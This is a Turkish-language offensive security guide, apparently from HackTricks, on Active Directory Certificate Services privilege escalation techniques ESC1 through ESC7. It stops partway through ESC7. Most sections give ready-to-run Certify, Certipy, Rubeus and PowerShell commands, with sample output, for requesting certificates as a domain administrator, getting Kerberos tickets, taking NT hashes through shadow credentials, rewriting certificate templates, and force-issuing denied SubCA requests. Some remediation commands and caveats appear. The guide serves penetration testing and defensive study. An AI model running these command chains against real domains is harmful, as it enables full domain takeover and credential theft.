# AD CS Etki Alanı Yetki Yükseltme

{{#include ../../../banners/hacktricks-training.md}}


**Bu, aşağıdaki yazılardaki yetki yükseltme tekniği bölümlerinin özetidir:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Yanlış Yapılandırılmış Sertifika Şablonları - ESC1

### Açıklama

### Yanlış Yapılandırılmış Sertifika Şablonları - ESC1 Açıklaması

- **Kurumsal CA, düşük ayrıcalıklı kullanıcılara kayıt hakları verir.**
- **Yönetici onayı gerekmez.**
- **Yetkili personelin imzaları gerekmez.**
- **Sertifika şablonlarındaki güvenlik tanımlayıcıları aşırı izin vericidir ve düşük ayrıcalıklı kullanıcıların kayıt hakkı elde etmesine olanak tanır.**
- **Sertifika şablonları, kimlik doğrulamayı kolaylaştıran EKU'ları tanımlayacak şekilde yapılandırılmıştır:**
  - İstemci Kimlik Doğrulaması (OID 1.3.6.1.5.5.7.3.2), PKINIT İstemci Kimlik Doğrulaması (1.3.6.1.5.2.3.4), Akıllı Kart Oturumu Açma (OID 1.3.6.1.4.1.311.20.2.2), Herhangi Bir Amaç (OID 2.5.29.37.0) gibi Genişletilmiş Anahtar Kullanımı (EKU) tanımlayıcıları veya EKU bulunmaması (SubCA) yer alır.
- **Şablon, istekte bulunanların Sertifika İmzalama İsteğine (CSR) bir subjectAltName eklemesine izin verir:**
  - Active Directory (AD), kimlik doğrulaması için sertifikadaki subjectAltName'e (SAN) öncelik verir. Bu nedenle, CSR'de SAN belirtilerek herhangi bir kullanıcıyı (ör. etki alanı yöneticisini) taklit etmek üzere sertifika istenebilir. İstekte bulunanın SAN belirtip belirtemeyeceği, sertifika şablonunun AD nesnesindeki `mspki-certificate-name-flag` özelliğiyle belirlenir. Bu özellik bir bit maskesidir ve `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` bayrağının bulunması, istekte bulunanın SAN belirtmesine izin verir.

> [!CAUTION]
> Bu ayarlar, ESC1 şablonu adayı olduğunu gösterir; tamamlanmış bir taklit yolunu değil. Hedef sorumlunun şablonu yayımlayan bir CA üzerinden kayıt yaptırabildiğini, CA kaydına izin verildiğini ve verilen sertifikanın kimlik doğrulama uç noktasının güçlü SID eşleme kurallarını karşıladığını doğrulayın. Güncel yamalı KDC'ler, sertifikadaki SID hedefle eşleşmediğinde istenen UPN'yi reddedebilir; bkz. [Microsoft'un sertifika eşleme kılavuzu](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

**Etki Alanı Bilgisayarları** grubuna verilen kayıt hakları, özgün kullanıcı kayıt yaptıramasa bile hazırlanan bir bilgisayar kimliğinin uygun olmasını sağlayabilir. Bilgisayar sorumlusunun haklarını ayrıca değerlendirin. İstek oluşturmadan önce `msPKI-Minimal-Key-Size` değerini kontrol edin: 4096 bit RSA anahtarı gerektiren bir şablon, istemcinin varsayılan 2048 bit anahtarını reddeder. İstekte sağlanan bir hedef SID, SID uyuşmazlığını yalnızca CA ve KDC ortaya çıkan sertifikayı ve eşlemeyi kabul ediyorsa giderebilir; şablon bayrakları veya tek başına bir Enroll ACE bunun kanıtı değildir.

Bu özellik bazen ürünlerin veya dağıtım hizmetlerinin HTTPS ya da ana makine sertifikalarını anında oluşturmasını desteklemek için veya yeterli bilgi sahibi olunmadığından etkinleştirilir.

Bu seçeneğin kullanıldığı bir sertifika oluşturmanın uyarı verdiği belirtilmiştir. Ancak mevcut bir sertifika şablonu (örneğin `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` etkin olan `WebServer` şablonu) çoğaltılıp kimlik doğrulama OID'si içerecek şekilde değiştirildiğinde uyarı gösterilmez.<sup>[[6]](#references)</sup>

### Kötüye Kullanım

**Güvenlik açığı bulunan sertifika şablonlarını bulmak** için şunu çalıştırabilirsiniz:

```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```

Bu güvenlik açığını **bir yöneticiyi taklit etmek için kötüye kullanmak** amacıyla şu komut çalıştırılabilir:

```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
  /url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
  -template 'ESC1' -upn 'administrator@corp.local'
```

Ardından oluşturulan **sertifikayı `.pfx`** biçimine dönüştürebilir ve bunu **Rubeus veya certipy kullanarak yeniden kimlik doğrulaması yapmak** için kullanabilirsiniz:<sup>[[5]](#references)</sup>

```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```

Windows ikili dosyaları "Certreq.exe" ve "Certutil.exe", PFX oluşturmak için kullanılabilir: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

AD Forest’ün yapılandırma şemasındaki sertifika şablonları; özellikle onay veya imza gerektirmeyen, Client Authentication ya da Smart Card Logon EKU’suna sahip ve `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` bayrağı etkin olan şablonlar, aşağıdaki LDAP sorgusu çalıştırılarak listelenebilir:

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```

## Yanlış Yapılandırılmış Sertifika Şablonları - ESC2

### Açıklama

İkinci kötüye kullanım senaryosu, ilk senaryonun bir çeşididir:

1. Enterprise CA tarafından düşük ayrıcalıklı kullanıcılara kayıt hakları verilir.
2. Yönetici onayı gereksinimi devre dışı bırakılır.
3. Yetkili imza gereksinimi kaldırılır.
4. Sertifika şablonundaki aşırı izin verici bir güvenlik tanımlayıcısı, düşük ayrıcalıklı kullanıcılara sertifika kaydı hakları verir.
5. **Sertifika şablonu, Any Purpose EKU'yu veya hiç EKU içermeyecek şekilde tanımlanmıştır.**

**Any Purpose EKU**, saldırganın istemci kimlik doğrulama, sunucu kimlik doğrulama, kod imzalama vb. **herhangi bir amaçla** kullanılabilecek bir sertifika edinmesine olanak tanır. Bu senaryoyu istismar etmek için **ESC3 için kullanılan tekniğin** aynısı kullanılabilir.

Alt CA sertifikaları gibi davranan **EKU içermeyen** sertifikalar **herhangi bir amaçla** istismar edilebilir ve **yeni sertifikaları imzalamak için de kullanılabilir**. Bu nedenle saldırgan, bir alt CA sertifikasından yararlanarak yeni sertifikalarda rastgele EKU'lar veya alanlar belirtebilir.

Ancak, alt CA **`NTAuthCertificates`** nesnesi tarafından güvenilir değilse (varsayılan ayar budur), **etki alanı kimlik doğrulaması** için oluşturulan yeni sertifikalar çalışmaz. Buna rağmen saldırgan, **herhangi bir EKU** ve rastgele sertifika değerleri içeren **yeni sertifikalar** oluşturabilir. Bunlar çok çeşitli amaçlar için (ör. kod imzalama, sunucu kimlik doğrulama vb.) **kötüye kullanılabilir** ve ağdaki SAML, AD FS veya IPSec gibi diğer uygulamalar açısından önemli sonuçlar doğurabilir.<sup>[[6]](#references)</sup>

AD Forest yapılandırma şemasında bu senaryoyla eşleşen şablonları numaralandırmak için aşağıdaki LDAP sorgusu çalıştırılabilir:

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```

## Yanlış Yapılandırılmış Enrollment Agent Şablonları - ESC3

### Açıklama

Bu senaryo birinci ve ikinci senaryolara benzer, ancak **farklı bir EKU'nun** (Certificate Request Agent) ve **2 farklı şablonun** kötüye kullanılmasını içerir (bu nedenle 2 ayrı gereksinim kümesi vardır).

Microsoft belgelerinde **Enrollment Agent** olarak bilinen **Certificate Request Agent EKU'su** (OID 1.3.6.1.4.1.311.20.2.1), bir sorumlunun başka bir kullanıcı **adına bir sertifika için kayıt olmasına** olanak tanır.

**“Enrollment agent”**, böyle bir **şablon** için kayıt olur ve elde ettiği **sertifikayı, diğer kullanıcı adına CSR'yi birlikte imzalamak için kullanır**. Ardından **birlikte imzalanmış CSR'yi**, **“başkası adına kayıt olmayı” sağlayan** bir **şablona** kayıt olmak üzere CA'ya **gönderir** ve CA, **“diğer” kullanıcıya ait bir sertifikayla** yanıt verir.<sup>[[6]](#references)</sup>

**Gereksinimler 1:**

- Enterprise CA, düşük ayrıcalıklı kullanıcılara kayıt hakları verir.
- Yönetici onayı gereksinimi devre dışıdır.
- Yetkili imza gereksinimi yoktur.
- Sertifika şablonunun güvenlik tanımlayıcısı aşırı izin vericidir ve düşük ayrıcalıklı kullanıcılara kayıt hakları verir.
- Sertifika şablonu, diğer sorumlular adına başka sertifika şablonları için istekte bulunmayı sağlayan Certificate Request Agent EKU'sunu içerir.

**Gereksinimler 2:**

- Enterprise CA, düşük ayrıcalıklı kullanıcılara kayıt hakları verir.
- Yönetici onayı atlanır.
- Sürüm 1 hedef şablon, yeni ayrıntılı yayımlama ilkesi denetimleri olmadan bir enrollment agent'ı kabul edebilir; sürüm 2 veya daha yeni şablonlarda, şablonu yalnızca sürümüne bakarak elemek yerine uygulama ilkesi yayımlama gereksinimlerini ve yetkili imzaları değerlendirin.
- Sertifika şablonunda tanımlı bir EKU, etki alanı kimlik doğrulamasına izin verir.
- CA'da enrollment agent kısıtlamaları uygulanmaz.

Hedef şablon ayrıca seçilen CA tarafından yayımlanmalı, hedef hesabın kayıt olmasına izin vermeli ve amaçlanan etki alanı kimlik doğrulama kullanımını desteklemelidir. Bu hesaptaki gerekli konu/SAN özniteliklerini kontrol edin; örneğin, AD'den konu e-postası oluşturan bir şablon, gerekli `mail` değeri olmayan bir hesap için sertifika veremez. Tek başına bir agent sertifikası, bu hedef şablon gereksinimlerini karşılamaz.

### Kötüye Kullanım

Bu senaryoyu kötüye kullanmak için [**Certify**](https://github.com/GhostPack/Certify) veya [**Certipy**](https://github.com/ly4k/Certipy) kullanabilirsiniz:<sup>[[4]](#references)</sup>

```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```

**Enrollment agent certificate** edinmesine izin verilen **kullanıcılar**, enrollment **agent**'larının enrollment yapmasına izin verilen şablonlar ve enrollment agent'ın adına işlem yapabileceği **hesaplar**, kurumsal CA'lar tarafından kısıtlanabilir. Bunun için `certsrc.msc` **snap-in**'i açılır, **CA'ya sağ tıklanır**, **Properties** seçilir ve ardından “Enrollment Agents” sekmesine **gidilir**.

Ancak CA'lar için **varsayılan** ayarın “**Do not restrict enrollment agents**” olduğu belirtilmektedir. Yöneticiler enrollment agent'ları kısıtlamayı etkinleştirip “Restrict enrollment agents” ayarını seçtiğinde bile varsayılan yapılandırma son derece izin vericidir. **Everyone** grubuna tüm şablonlarda herhangi biri olarak enrollment yapma izni verir.

### Certi-Bhai ile yalnızca Windows'ta çalışan PowerShell PoC'leri

[**Certi-Bhai**](https://github.com/incredibleindishell/Certi-Bhai), Certify veya Certipy kullanmadan ESC1 ve ESC2/ESC3'ü gerçekleştirir. Betikleri, `X509Enrollment` COM API'siyle dışa aktarılabilir 2048 bitlik bir RSA anahtarı oluşturur, bir PKCS#10 isteği hazırlar, LDAP üzerinden ilk `pKIEnrollmentService` nesnesini bulur, isteği `CertificateAuthority.Request` aracılığıyla gönderir, yanıtı `Cert:\CurrentUser\My` konumuna yükler ve Base64 kodlu bir PFX dışa aktarır. ESC1 betiği, saldırganın seçtiği bir UPN SAN'ı (`XCN_CERT_ALT_NAME_USER_PRINCIPLE_NAME`, değer `0xb`) eklerken ESC2/ESC3 betikleri, ilk sertifikayı kullanarak başkası adına bir PKCS#7 isteği imzalar.<sup>[[27]](#references)</sup>

```powershell
# ESC1: supply the identity in the subject and UPN SAN
.\ESC1\esc1.ps1 -subjectName "CN=Administrator,CN=Users,DC=corp,DC=local" `
  -altName "administrator@corp.local" -templateName "VulnESC1" -pfxPass "PfxPass!"

# ESC2/ESC3: obtain an agent-capable certificate, then enroll for the target
.\ESC3\esc3_working.ps1 -templateName "VulnEnrollmentAgent" `
  -target_user "administrator" -domain "CORP" -pfxPass "PfxPass!"
```

Betikler, Rubeus ile doğrudan kullanmak üzere özel anahtarı içeren **PFX**'in Base64 kodlamasını yazdırır. Bunu `[Convert]::ToBase64String($cert.RawData)` ile değiştirmeyin: `RawData` yalnızca açık sertifikayı kodlar ve PKINIT isteğini imzalayamaz.<sup>[[5]](#references)[[27]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:administrator /certificate:<BASE64_PFX> /password:PfxPass! /nowrap
```

## Güvenlik Açığı Bulunan Sertifika Şablonu Erişim Denetimi - ESC4

### **Açıklama**

**Sertifika şablonları** üzerindeki **güvenlik tanımlayıcısı**, **AD sorumlularının** şablonla ilgili sahip olduğu **izinleri** tanımlar.

Bir **saldırgan**, bir **şablonu** **değiştirmek** ve **önceki bölümlerde** açıklanan **istismar edilebilir yanlış yapılandırmaları** uygulamak için gerekli **izinlere** sahipse, ayrıcalık yükseltme mümkün olabilir.

Sertifika şablonları için geçerli olan önemli izinler şunlardır:<sup>[[6]](#references)</sup>

- **Owner:** Nesne üzerinde örtük denetim sağlar ve tüm özniteliklerin değiştirilmesine olanak tanır.
- **FullControl:** Tüm öznitelikleri değiştirme yeteneği de dahil olmak üzere nesne üzerinde tam yetki sağlar.
- **WriteOwner:** Nesnenin sahibinin, saldırganın denetimindeki bir sorumlu olarak değiştirilmesine izin verir.
- **WriteDacl:** Erişim denetimlerinin değiştirilmesine olanak tanır ve saldırgana FullControl izni verilmesini sağlayabilir.
- **WriteProperty:** Nesne özelliklerinin düzenlenmesine izin verir.

`CN=Certificate Templates,CN=Public Key Services,CN=Services,...` kapsayıcısındaki DACL'yi de inceleyin. [`pKICertificateTemplate` sınıfına](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adsc/db4b45f7-e57a-4ae1-9b8f-1b107b69d98c) kapsamlandırılmış geçerli bir `CreateChild` ACE'si veya geniş kapsamlı tam denetim, yeni bir şablon nesnesi oluşturmak için kullanılabilir. [Microsoft'un belgelerine](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wcce/9279abb2-3dfa-4631-845c-43c187ac4b44) göre bu kapsayıcı, söz konusu şablon nesnelerini barındırır. Oluşturma işleminin mümkün olup olmadığına karar vermeden önce eşleşen deny ACE'lerini ve devralma ayarlarını inceleyin. Oluşturulan bir şablon tek başına sertifika vermez: Bir CA'nın şablonu yayımlaması, istekte bulunan sorumlunun enrollment erişimine sahip olması ve sertifikanın kimlik doğrulama uç noktasında hedeflenen kimlikle eşleşmesi gerekir.

### Kötüye Kullanım

Şablonlar ve diğer PKI nesneleri üzerinde düzenleme haklarına sahip sorumluları belirlemek için Certify ile numaralandırma yapın:

```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```

Önceki örneğe benzer bir privesc örneği:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4, bir kullanıcının sertifika şablonu üzerinde yazma ayrıcalıklarına sahip olmasıdır. Örneğin bu durum, sertifika şablonunun yapılandırmasını ESC1'e karşı savunmasız hâle getirecek şekilde değiştirmek için kötüye kullanılabilir.

Kayıt olan kişinin konu bilgisini belirtmesine izin veren, ancak yalnızca Server Authentication kullanımına sahip bir şablon, tek başına kullanıcı oturum açma şablonu değildir. Şablon üzerinde etkili denetim haklarına sahip bir saldırgan, sertifika istemeden önce kimlik doğrulama EKU'larını veya uygulama politikalarını değiştirebilir; [Microsoft, Smartcard Logon EKU'sunun oturum açma amacını belgeliyor](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/certificate-template-concepts). CA'nin değiştirilmiş şablonu yayımladığını, istekte bulunanın kayıt olabildiğini, onay/imza gereksinimlerinin karşılandığını ve verilen sertifikanın hedeflenen hesaba eşlendiğini doğrulayın. Özellikle, [Full Enforcement modundaki yamalı etki alanı denetleyicileri](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers) güçlü eşleme olmadan sertifikaları reddeder; isteğe hedef UPN'yi eklemek bu gereksinimi aşmaz.

Yukarıdaki yolda görebileceğimiz gibi, bu ayrıcalıklara yalnızca `JOHNPC` sahip; ancak kullanıcımız `JOHN`, `JOHNPC`'ye yönelik yeni `AddKeyCredentialLink` kenarına sahip. Bu teknik sertifikalarla ilgili olduğundan, bu saldırıyı da uyguladım. Saldırı [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) olarak bilinir.<sup>[[8]](#references)</sup> İşte kurbanın NT hash'ini almak için Certipy'nin `shadow auto` komutuna kısa bir ön bakış.

```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```

**Certipy**, tek bir komutla sertifika şablonunun yapılandırmasını değiştirebilir. **Varsayılan olarak** Certipy, yapılandırmayı **ESC1'e karşı savunmasız** hâle getirecek şekilde **değiştirir**. Ayrıca, eski yapılandırmayı kaydetmek için **`-save-old` parametresini belirtebiliriz**; bu, saldırımızdan sonra yapılandırmayı **geri yüklemek** için kullanışlı olacaktır.

```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```

## Savunmasız PKI Nesnesi Erişim Denetimi - ESC5

### Açıklama

Sertifika şablonlarının ve sertifika yetkilisinin ötesindeki çeşitli nesneleri de içeren, ACL tabanlı ilişkilerden oluşan geniş ağ, tüm AD CS sisteminin güvenliğini etkileyebilir. Güvenliği önemli ölçüde etkileyebilecek bu nesneler şunlardır:

- S4U2Self veya S4U2Proxy gibi yöntemlerle ele geçirilebilecek CA sunucusunun AD bilgisayar nesnesi.
- CA sunucusunun RPC/DCOM sunucusu.
- `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>` kapsayıcı yolundaki tüm alt AD nesneleri veya kapsayıcıları. Bu yol, Sertifika Şablonları kapsayıcısı, Sertifika Yetkilileri kapsayıcısı, NTAuthCertificates nesnesi ve Enrollment Services kapsayıcısı gibi kapsayıcı ve nesneleri içerir ancak bunlarla sınırlı değildir.

Düşük ayrıcalıklı bir saldırgan bu kritik bileşenlerden herhangi birinin denetimini ele geçirmeyi başarırsa PKI sisteminin güvenliği tehlikeye girebilir.<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Açıklama

[**CQure Academy gönderisinde**](https://cqureacademy.com/blog/enhanced-key-usage) ele alınan konu, Microsoft'un açıkladığı üzere **`EDITF_ATTRIBUTESUBJECTALTNAME2`** bayrağının etkilerine de değinir. Sertifika Yetkilisi (CA) üzerinde etkinleştirildiğinde bu yapılandırma, Active Directory®'den oluşturulanlar da dahil olmak üzere **herhangi bir isteğin** **subject alternative name** alanına **kullanıcı tanımlı değerlerin** eklenmesine izin verir. Sonuç olarak bu özellik, saldırganın etki alanı **kimlik doğrulaması** için yapılandırılmış **herhangi bir şablon** üzerinden sertifika almasına olanak tanır; buna standart User şablonu gibi, **ayrıcalıksız** kullanıcıların sertifika almasına açık şablonlar da dahildir. Böylece saldırgan, etki alanı yöneticisi veya etki alanındaki **diğer herhangi bir etkin varlık** olarak kimlik doğrulaması yapmasını sağlayacak bir sertifika edinebilir.<sup>[[9]](#references)</sup>

**Not**: `certreq.exe` içindeki `-attrib "SAN:"` argümanı (“Name Value Pairs” olarak anılır) aracılığıyla Certificate Signing Request (CSR) içine **alternative names** ekleme yöntemi, ESC1'deki SAN exploitation stratejisinden **farklıdır**. Buradaki fark, **hesap bilgilerinin nasıl kapsüllendiğidir**—bir extension yerine sertifika attribute'u içinde.

### Kötüye Kullanım

Ayarın etkin olup olmadığını doğrulamak için kuruluşlar `certutil.exe` ile aşağıdaki komutu kullanabilir:

```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```

Bu işlem esasen **uzak kayıt defteri erişimi** kullanır; bu nedenle alternatif bir yaklaşım şöyle olabilir:

```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```

[**Certify**](https://github.com/GhostPack/Certify) ve [**Certipy**](https://github.com/ly4k/Certipy) gibi araçlar bu yanlış yapılandırmayı tespit edip exploit edebilir:<sup>[[4]](#references)</sup>

```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```

Bu ayarları değiştirmek için, **domain yönetici** haklarına veya eşdeğerine sahip olunduğu varsayılarak, aşağıdaki komut herhangi bir iş istasyonundan çalıştırılabilir:

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```

Bu yapılandırmayı ortamınızda devre dışı bırakmak için flag şu komutla kaldırılabilir:

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```

> [!WARNING]
> Mayıs 2022 güvenlik güncellemelerinden sonra oluşturulan yeni **sertifikalar**, **istekte bulunanın `objectSid` özelliğini** içeren bir **güvenlik uzantısı** barındıracaktır. ESC1 için bu SID, belirtilen SAN'dan türetilir. Ancak **ESC6** için SID, SAN'ı değil, **istekte bulunanın `objectSid` değerini** yansıtır.\
> ESC6'yı istismar etmek için sistemin, **SAN'a yeni güvenlik uzantısından daha yüksek öncelik veren** ESC10 (Zayıf Sertifika Eşlemeleri) açığına sahip olması gerekir.

## Zafiyetli Sertifika Yetkilisi Erişim Denetimi - ESC7

### Saldırı 1

#### Açıklama

Sertifika yetkilisi erişim denetimi, CA eylemlerini yöneten bir dizi izinle sağlanır. Bu izinler, `certsrv.msc`'ye erişerek, bir CA'ya sağ tıklayarak, özellikleri seçerek ve ardından Güvenlik sekmesine giderek görüntülenebilir. Ayrıca, izinler PSPKI modülüyle aşağıdaki gibi komutlar kullanılarak listelenebilir:

```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```

Bu, sırasıyla “CA administrator” ve “Certificate Manager” rollerine karşılık gelen **`ManageCA`** ve **`ManageCertificates`** temel hakları hakkında bilgi sağlar.<sup>[[6]](#references)</sup>

#### Abuse

Bir sertifika yetkilisi üzerinde **`ManageCA`** haklarına sahip olmak, principal’ın PSPKI kullanarak ayarları uzaktan değiştirmesine olanak tanır. Buna, herhangi bir template’te SAN belirtimine izin vermek için **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag’ini etkinleştirmek de dahildir; bu, domain yükseltmenin kritik bir unsurudur.

Bu süreci basitleştirmek için PSPKI’nin **Enable-PolicyModuleFlag** cmdlet’i kullanılabilir; böylece doğrudan GUI ile etkileşime gerek kalmadan değişiklik yapılabilir.

**`ManageCertificates`** haklarına sahip olmak, bekleyen isteklerin onaylanmasını sağlar ve böylece “CA certificate manager approval” korumasını etkili biçimde aşar.

Bir sertifikayı istemek, onaylamak ve indirmek için **Certify** ve **PSPKI** modülleri birlikte kullanılabilir:

```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```

### Attack 2

#### Açıklama

> [!WARNING]
> **Önceki saldırıda**, **ESC6 attack** gerçekleştirmek için **EDITF_ATTRIBUTESUBJECTALTNAME2** flag'ini **etkinleştirmek** üzere **`Manage CA`** permissions kullanılmıştı, ancak CA service (`CertSvc`) yeniden başlatılana kadar bunun hiçbir etkisi olmayacaktır. Bir kullanıcı `Manage CA` access right'ına sahip olduğunda, **service'i yeniden başlatmasına** da izin verilir. Ancak bu, kullanıcının service'i uzaktan yeniden başlatabileceği anlamına **gelmez**. Ayrıca, Mayıs 2022 güvenlik güncellemeleri nedeniyle **ESC6, yamalanmış ortamların çoğunda varsayılan olarak çalışmayabilir**.

Bu nedenle burada başka bir saldırı sunulmaktadır.

Ön koşullar:

- Yalnızca **`ManageCA` permission**
- **`Manage Certificates`** permission (**`ManageCA`** üzerinden verilebilir)
- **`SubCA`** certificate template'i **etkinleştirilmiş** olmalıdır (**`ManageCA`** üzerinden etkinleştirilebilir)

Bu teknik, `Manage CA` _ve_ `Manage Certificates` access right'larına sahip kullanıcıların **başarısız certificate request'lerini onaylayabilmesine** dayanır. **`SubCA`** certificate template'i **ESC1'e karşı savunmasızdır**, ancak template'e yalnızca **administrators** enroll olabilir. Dolayısıyla bir **user**, **`SubCA`** template'ine enroll olmayı **talep edebilir**; bu talep **reddedilir**, ancak **daha sonra yönetici tarafından onaylanır**.<sup>[[6]](#references)</sup>

#### Kötüye Kullanım

Kullanıcınızı yeni bir officer olarak ekleyerek kendinize **`Manage Certificates`** access right'ını verebilirsiniz.

```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```

**`SubCA`** şablonu, `-enable-template` parametresiyle **CA üzerinde etkinleştirilebilir**. Varsayılan olarak `SubCA` şablonu etkindir.

```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```

Bu saldırı için ön koşulları yerine getirdiysek, **`SubCA` şablonunu temel alan bir sertifika talep ederek** başlayabiliriz.

**Bu istek reddedile**cektir, ancak özel anahtarı kaydedip istek kimliğini not edeceğiz.

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```

**`Manage CA` ve `Manage Certificates`** yetkileriyle, `ca` komutunu ve `-issue-request <request ID>` parametresini kullanarak **başarısız sertifika isteğini düzenleyebiliriz**.

```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```

Ve son olarak, `req` komutunu ve `-retrieve <request ID>` parametresini kullanarak **verilen sertifikayı alabiliriz**.

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

